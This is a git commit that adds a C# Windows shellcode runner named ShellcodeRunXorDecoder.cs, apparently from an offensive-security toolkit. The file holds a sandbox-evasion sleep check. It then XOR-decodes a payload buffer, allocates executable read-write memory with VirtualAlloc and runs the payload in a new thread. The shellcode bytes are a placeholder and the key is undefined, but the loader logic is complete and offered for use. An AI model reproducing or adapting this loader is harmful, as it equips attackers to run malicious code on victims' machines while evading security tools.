c677757d0b18a1084f38283362e0e9f02c1c3c8d
Captain Barnacles <83349783+0x074b@users.noreply.github.com>
2023-08-25 05:21:19 +0200

    Create ShellcodeRunXorDecoder.cs

---
+++ Custom Binaries/ShellcodeRunXorDecoder.cs
@@ -0,0 +1,40 @@
+﻿using System.Runtime.InteropServices;
+using System;
+namespace rev
+{
+    public class Program
+    {
+        public const uint EXECUTEREADWRITE  = 0x40;
+        public const uint COMMIT_RESERVE = 0x3000;
+        [DllImport("kernel32.dll")]
+        static extern void Sleep(uint dwMilliseconds);
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private unsafe static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern Int32 WaitForSingleObject(IntPtr Handle, Int32 Wait);
+        public static void Main()
+        {
+            DateTime t1 = DateTime.Now;
+            Sleep(10000);
+            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
+            if (deltaT < 9.5)
+            {
+                return;
+            }
+            byte[] buf = new byte[511] {
+            shellcode
+            };
+            int payloadSize = buf.Length;
+            IntPtr payAddr = VirtualAlloc(IntPtr.Zero, payloadSize, COMMIT_RESERVE, EXECUTEREADWRITE);
+            for (int i = 0; i < buf.Length; i++)
+            {
+                buf[i] = (byte)((uint)buf[i] ^ XorKey);
+            }
+            Marshal.Copy(buf, 0, payAddr, payloadSize);
+            IntPtr payThreadId = CreateThread(IntPtr.Zero, 0, payAddr, IntPtr.Zero, 0, 0);
+            int waitResult = WaitForSingleObject(payThreadId, -1);
+        }
+    }
+}
